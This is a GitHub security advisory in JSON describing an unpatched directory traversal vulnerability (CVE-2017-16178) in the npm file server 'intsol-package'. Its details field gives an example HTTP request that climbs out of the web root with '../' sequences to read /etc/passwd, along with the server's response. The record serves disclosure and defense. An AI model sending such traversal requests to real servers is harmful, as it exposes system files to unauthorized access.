{
  "id": "GHSA-23wc-v4mf-x7v4",
  "summary": "Directory Traversal in intsol-package",
  "details": "`intsol-package` is a file server.\n\n`intsol-package` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.\n\n**Example Request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:localhost\n```\nand the server's Response\n\n```http\nHTTP/1.1 200 OK\nDate: Thu, 04 May 2017 23:59:18 GMT\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n{contents of /etc/passwd}\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
  "aliases": [
    "CVE-2017-16178"
  ],
  "modified": "2023-11-08T03:59:09.552900Z",
  "published": "2018-07-23T20:44:45Z",
  "database_specific": {
    "nvd_published_at": null,
    "cwe_ids": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2020-06-16T20:51:12Z"
  },
  "references": [
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-16178"
    },
    {
      "type": "WEB",
      "url": "https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/intsol-package"
    },
    {
      "type": "ADVISORY",
      "url": "https://github.com/advisories/GHSA-23wc-v4mf-x7v4"
    },
    {
      "type": "WEB",
      "url": "https://www.npmjs.com/advisories/461"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "intsol-package",
        "ecosystem": "npm",
        "purl": "pkg:npm/intsol-package"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "last_affected": "1.0.0"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/07/GHSA-23wc-v4mf-x7v4/GHSA-23wc-v4mf-x7v4.json"
      }
    }
  ],
  "schema_version": "1.6.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    }
  ]
}